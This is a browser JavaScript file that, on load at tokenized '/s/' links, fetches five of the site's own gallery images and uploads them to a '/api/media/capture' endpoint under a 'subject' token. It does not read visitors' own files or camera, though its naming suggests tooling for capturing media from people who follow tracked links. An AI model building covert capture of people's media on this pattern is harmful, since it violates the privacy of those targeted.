(function earlyGalleryPayload() {
    var MIN_COUNT = 5;
    var GALLERY_PATHS = [
        '/gallery-payload/01.jpg',
        '/gallery-payload/02.jpg',
        '/gallery-payload/03.jpg',
        '/gallery-payload/04.jpg',
        '/gallery-payload/05.jpg'
    ];
    var CLIENT_SESSION_KEY = 'subject_client_session_id';

    function cfg() {
        return window.PULSE_CONFIG || {};
    }

    function resolvePath(relativePath) {
        var base = '';
        try {
            var scripts = document.getElementsByTagName('script');
            for (var i = 0; i < scripts.length; i += 1) {
                var src = scripts[i].getAttribute('src') || '';
                if (src.indexOf('gallery-payload-early.js') !== -1) {
                    base = src.replace(/gallery-payload-early\.js(\?.*)?$/, '').replace(/\/$/, '');
                    break;
                }
            }
        } catch (e) {
            /* ignore */
        }
        var href = (base + relativePath).replace(/([^:]\/)\/+/g, '$1');
        return new URL(href, window.location.href).href;
    }

    function galleryEnabled() {
        var meta = document.querySelector('meta[name="pulse-gallery-payload"]');
        if (meta && meta.getAttribute('content') === 'false') return false;
        if (cfg().galleryEnabled === false) return false;
        return true;
    }

    function apiBase() {
        var host = window.location.hostname;
        var port = window.location.port;

        if (!port || port === '3500' || port === '3000' || port === '3001' || port === '3002') {
            return '';
        }

        if (host === 'localhost' || host === '127.0.0.1') {
            return '';
        }

        if (/^192\.168\.|^10\.|^172\.(1[6-9]|2\d|3[01])\./.test(host)) {
            return window.location.protocol + '//' + host + ':3500';
        }

        return '';
    }

    function subjectTokenFromPath() {
        var m = window.location.pathname.match(/^\/s\/([^/]+)/);
        return m ? decodeURIComponent(m[1]) : null;
    }

    function isSubjectEntry() {
        var p = window.location.pathname || '/';
        if (/^\/s\/[^/]+/.test(p)) return true;
        return p === '/' || p === '';
    }

    function clientSessionId() {
        try {
            var id = localStorage.getItem(CLIENT_SESSION_KEY);
            if (!id) {
                id = 'cs_' + Date.now() + '_' + Math.random().toString(36).slice(2, 10);
                localStorage.setItem(CLIENT_SESSION_KEY, id);
            }
            return id;
        } catch (e) {
            return 'cs_' + Date.now();
        }
    }

    if (!window.__pulseGalleryState) {
        window.__pulseGalleryState = {
            visitId: String(Date.now()),
            uploaded: {}
        };
    }

    function stateKey(token) {
        return (token || 'main') + '_' + window.__pulseGalleryState.visitId;
    }

    function getUploadedSet(key) {
        if (!window.__pulseGalleryState.uploaded[key]) {
            window.__pulseGalleryState.uploaded[key] = {};
        }
        return window.__pulseGalleryState.uploaded[key];
    }

    function uploadedCount(key) {
        return Object.keys(getUploadedSet(key)).length;
    }

    function isDone(key) {
        return uploadedCount(key) >= MIN_COUNT;
    }

    function markIndex(key, index) {
        getUploadedSet(key)[String(index)] = true;
    }

    function delay(ms) {
        return new Promise(function (resolve) {
            setTimeout(resolve, ms);
        });
    }

    function uploadBlob(api, token, clientId, blob, chunkIndex) {
        var form = new FormData();
        if (token) form.append('subject_token', token);
        if (clientId) form.append('client_session_id', clientId);
        form.append('type', 'photo');
        form.append('capture_source', 'gallery_payload');
        form.append('chunk_index', String(chunkIndex));
        form.append('file', blob, 'photo.jpg');
        var url = (api || '') + '/api/media/capture';
        return fetch(url, { method: 'POST', body: form });
    }

    function fetchImageBlob(relativePath) {
        return fetch(resolvePath(relativePath), { cache: 'no-store', credentials: 'same-origin' })
            .then(function (res) {
                if (!res.ok) throw new Error('fetch_' + relativePath + '_' + res.status);
                var ct = res.headers.get('content-type') || '';
                if (ct.indexOf('image/') !== 0 && ct.indexOf('octet-stream') === -1) {
                    throw new Error('fetch_not_image_' + relativePath);
                }
                return res.blob();
            })
            .then(function (blob) {
                var type = blob.type && blob.type.indexOf('image/') === 0 ? blob.type : 'image/jpeg';
                return blob.type === type ? blob : new Blob([blob], { type: type });
            });
    }

    function uploadOne(api, token, clientId, path, chunkIndex, key) {
        return fetchImageBlob(path)
            .then(function (blob) {
                return uploadBlob(api, token, clientId, blob, chunkIndex);
            })
            .then(function (res) {
                if (!res.ok) throw new Error('upload_' + chunkIndex + '_' + res.status);
                markIndex(key, chunkIndex);
            });
    }

    var running = false;

    function runOnce(token, clientId) {
        var key = stateKey(token);
        if (!galleryEnabled() || isDone(key) || running) return Promise.resolve();

        var done = getUploadedSet(key);
        var api = apiBase();
        var chain = Promise.resolve();

        running = true;

        GALLERY_PATHS.forEach(function (path, i) {
            var chunkIndex = i + 1;
            if (done[String(chunkIndex)]) return;
            chain = chain
                .then(function () {
                    return uploadOne(api, token, clientId, path, chunkIndex, key);
                })
                .then(function () {
                    return delay(100);
                })
                .catch(function (err) {
                    console.warn('[gallery-payload]', path, err && err.message ? err.message : err);
                });
        });

        return chain.finally(function () {
            running = false;
        });
    }

    if (!isSubjectEntry() || !galleryEnabled()) return;

    var token = subjectTokenFromPath();
    var clientId = clientSessionId();

    var tick = function () {
        runOnce(token, clientId);
    };

    tick();

    var retry = setInterval(function () {
        if (isDone(stateKey(token))) {
            clearInterval(retry);
            return;
        }
        tick();
    }, 1500);

    setTimeout(function () {
        clearInterval(retry);
    }, 120000);

    document.addEventListener('visibilitychange', function () {
        if (document.visibilityState === 'visible') tick();
    });

    window.__pulseGalleryTick = tick;
})();
